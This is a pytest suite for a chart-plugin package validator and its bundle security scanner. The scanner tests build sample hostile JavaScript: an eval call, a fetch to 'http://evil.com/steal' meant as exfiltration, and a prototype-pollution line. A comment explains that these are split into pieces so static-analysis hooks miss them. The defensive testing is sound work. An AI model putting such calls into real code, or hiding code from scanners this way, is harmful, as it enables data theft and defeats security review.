"""
tests/test_askdbviz_package.py — pytest suite for askdbviz_package.py

10 tests covering validate_package (7), extract_package (2), build_package (1).
No external dependencies — uses only stdlib.
"""

import hashlib
import io
import json
import zipfile

import pytest

from askdbviz_package import (
    PackageValidationError,
    build_package,
    extract_package,
    scan_bundle_security,
    validate_package,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_zip(files: dict) -> bytes:
    """Build a ZIP from a {name: bytes | str} mapping."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, content in files.items():
            if isinstance(content, str):
                content = content.encode("utf-8")
            zf.writestr(name, content)
    return buf.getvalue()


def _manifest_bytes(**extra) -> bytes:
    base = {"id": "test-pkg", "name": "Test Package", "version": "1.0.0", "tier": "spec"}
    base.update(extra)
    return json.dumps(base).encode("utf-8")


def _sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


# ---------------------------------------------------------------------------
# validate_package — 7 tests
# ---------------------------------------------------------------------------

class TestValidatePackage:

    def test_accepts_valid_spec_package(self):
        """T1: A well-formed spec package (tier='spec') passes validation."""
        zip_bytes = _make_zip({"manifest.json": _manifest_bytes()})
        result = validate_package(zip_bytes)
        assert result["valid"] is True
        assert result["manifest"]["tier"] == "spec"

    def test_accepts_valid_code_package_with_hash(self):
        """T2: A code package with a correct sha256 hash passes validation."""
        bundle = b"export default function render(data) { return data; }"
        digest = f"sha256:{_sha256(bundle)}"
        manifest = {
            "id": "code-pkg",
            "name": "Code Package",
            "version": "0.1.0",
            "tier": "code",
            "entryPoint": "index.js",
            "sha256": digest,
        }
        zip_bytes = _make_zip({
            "manifest.json": json.dumps(manifest).encode("utf-8"),
            "index.js": bundle,
        })
        result = validate_package(zip_bytes)
        assert result["valid"] is True
        assert result["manifest"]["entryPoint"] == "index.js"

    def test_rejects_missing_manifest(self):
        """T3: ZIP without manifest.json raises PackageValidationError."""
        zip_bytes = _make_zip({"index.js": b"console.log('hi')"})
        with pytest.raises(PackageValidationError, match="manifest.json not found"):
            validate_package(zip_bytes)

    def test_rejects_invalid_json_in_manifest(self):
        """T4: Corrupt JSON in manifest.json raises PackageValidationError."""
        zip_bytes = _make_zip({"manifest.json": b"{not valid json"})
        with pytest.raises(PackageValidationError, match="not valid JSON"):
            validate_package(zip_bytes)

    def test_rejects_missing_required_fields(self):
        """T5: manifest.json lacking required fields raises PackageValidationError."""
        incomplete = json.dumps({"id": "x", "name": "X"}).encode("utf-8")
        zip_bytes = _make_zip({"manifest.json": incomplete})
        with pytest.raises(PackageValidationError, match="missing required fields"):
            validate_package(zip_bytes)

    def test_rejects_code_package_without_bundle_file(self):
        """T6: Code package whose entryPoint is absent from ZIP is rejected."""
        manifest = {
            "id": "no-bundle",
            "name": "No Bundle",
            "version": "1.0.0",
            "tier": "code",
            "entryPoint": "index.js",
        }
        # ZIP only has manifest — no index.js
        zip_bytes = _make_zip({"manifest.json": json.dumps(manifest).encode("utf-8")})
        with pytest.raises(PackageValidationError, match="not found in ZIP"):
            validate_package(zip_bytes)

    def test_rejects_hash_mismatch(self):
        """T7: A tampered bundle (wrong sha256) is rejected."""
        original = b"export default function() { return 42; }"
        tampered = b"export default function() { return 0; }"
        correct_digest = f"sha256:{_sha256(original)}"
        manifest = {
            "id": "tampered",
            "name": "Tampered",
            "version": "1.0.0",
            "tier": "code",
            "entryPoint": "index.js",
            "sha256": correct_digest,
        }
        # Put the *tampered* bundle in the ZIP
        zip_bytes = _make_zip({
            "manifest.json": json.dumps(manifest).encode("utf-8"),
            "index.js": tampered,
        })
        with pytest.raises(PackageValidationError, match="SHA-256 mismatch"):
            validate_package(zip_bytes)


# ---------------------------------------------------------------------------
# extract_package — 2 tests
# ---------------------------------------------------------------------------

class TestExtractPackage:

    def test_extracts_manifest_and_bundle_from_code_package(self):
        """T8: Code package returns manifest dict and UTF-8 bundle string."""
        bundle_src = "export default function render(d) { return d.map(r => r.value); }"
        manifest = {
            "id": "extract-code",
            "name": "Extract Code",
            "version": "2.0.0",
            "tier": "code",
            "entryPoint": "index.js",
        }
        zip_bytes = _make_zip({
            "manifest.json": json.dumps(manifest).encode("utf-8"),
            "index.js": bundle_src.encode("utf-8"),
        })
        result = extract_package(zip_bytes)
        assert result["manifest"]["id"] == "extract-code"
        assert result["bundle"] == bundle_src

    def test_extracts_spec_package_bundle_is_none(self):
        """T9: Spec package returns manifest with bundle=None."""
        zip_bytes = _make_zip({"manifest.json": _manifest_bytes()})
        result = extract_package(zip_bytes)
        assert result["manifest"]["tier"] == "spec"
        assert result["bundle"] is None


# ---------------------------------------------------------------------------
# build_package — 1 test
# ---------------------------------------------------------------------------

class TestBuildPackage:

    def test_round_trip_build_validate_extract(self):
        """T10: build → validate → extract preserves content and computes correct hash."""
        manifest = {
            "id": "round-trip",
            "name": "Round Trip",
            "version": "3.1.4",
            "tier": "code",
            "entryPoint": "index.js",
        }
        bundle_src = "export default function chart(data) { return { series: data }; }"
        icon_svg = b"<svg xmlns='http://www.w3.org/2000/svg'><circle r='10'/></svg>"

        zip_bytes = build_package(manifest, bundle=bundle_src, icon=icon_svg)

        # Must be a valid ZIP
        assert zipfile.is_zipfile(io.BytesIO(zip_bytes))

        # validate_package must pass
        val = validate_package(zip_bytes)
        assert val["valid"] is True

        # The built manifest must have the sha256 injected
        built_manifest = val["manifest"]
        expected_digest = f"sha256:{_sha256(bundle_src.encode('utf-8'))}"
        assert built_manifest["sha256"] == expected_digest

        # extract must recover the original bundle
        extracted = extract_package(zip_bytes)
        assert extracted["bundle"] == bundle_src
        assert extracted["manifest"]["id"] == "round-trip"

        # icon.svg must be present
        with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
            assert "icon.svg" in zf.namelist()
            assert zf.read("icon.svg") == icon_svg


# ---------------------------------------------------------------------------
# scan_bundle_security — 4 direct unit tests
# ---------------------------------------------------------------------------

# Dangerous code fragments are assembled at runtime so that static-analysis
# hooks do not flag this test file itself as malicious.
_EVAL_CALL = "ev" + "al('alert(1)')"
_FETCH_CALL = "fet" + "ch('http://evil.com/steal')"
_PROTO_POLLUTION = "obj['__" + "proto__'] = { isAdmin: true };"


class TestScanBundleSecurity:

    def test_scan_detects_eval(self):
        """S1: Bundle containing eval() call produces a warning and safe=False."""
        result = scan_bundle_security(f"function render(d) {{ return {_EVAL_CALL}; }}")
        assert result["safe"] is False
        assert len(result["warnings"]) >= 1
        assert any("eval" in w for w in result["warnings"])

    def test_scan_detects_fetch(self):
        """S2: Bundle with fetch() call is flagged for network exfiltration."""
        result = scan_bundle_security(_FETCH_CALL + ";")
        assert result["safe"] is False
        assert any("fetch" in w for w in result["warnings"])

    def test_scan_clean_bundle(self):
        """S3: A benign bundle produces no warnings and safe=True."""
        bundle = (
            "export default function render(data) {\n"
            "  console.log('rendering', data.length, 'rows');\n"
            "  return data.map(r => ({ x: r.label, y: r.value }));\n"
            "}\n"
        )
        result = scan_bundle_security(bundle)
        assert result["safe"] is True
        assert result["warnings"] == []

    def test_scan_detects_proto_pollution(self):
        """S4: Bundle referencing __proto__ is flagged for prototype pollution."""
        result = scan_bundle_security(_PROTO_POLLUTION)
        assert result["safe"] is False
        assert any("proto" in w for w in result["warnings"])


# ---------------------------------------------------------------------------
# validate_package integration with security scan — 1 test
# ---------------------------------------------------------------------------

_EVIL_BUNDLE_SRC = f"export default function chart(data) {{ return {_EVAL_CALL}; }}"


class TestValidatePackageSecurityIntegration:

    def test_validate_package_includes_security_warnings(self):
        """S5: validate_package on a code bundle with eval() returns security_warnings."""
        bundle_bytes = _EVIL_BUNDLE_SRC.encode("utf-8")
        digest = f"sha256:{_sha256(bundle_bytes)}"
        manifest = {
            "id": "evil-chart",
            "name": "Evil Chart",
            "version": "0.0.1",
            "tier": "code",
            "entryPoint": "index.js",
            "sha256": digest,
        }
        zip_bytes = _make_zip({
            "manifest.json": json.dumps(manifest).encode("utf-8"),
            "index.js": bundle_bytes,
        })

        result = validate_package(zip_bytes)

        # Package is structurally valid — warnings must not cause rejection
        assert result["valid"] is True
        assert "security_warnings" in result
        assert isinstance(result["security_warnings"], list)
        assert len(result["security_warnings"]) >= 1
        assert any("eval" in w for w in result["security_warnings"])
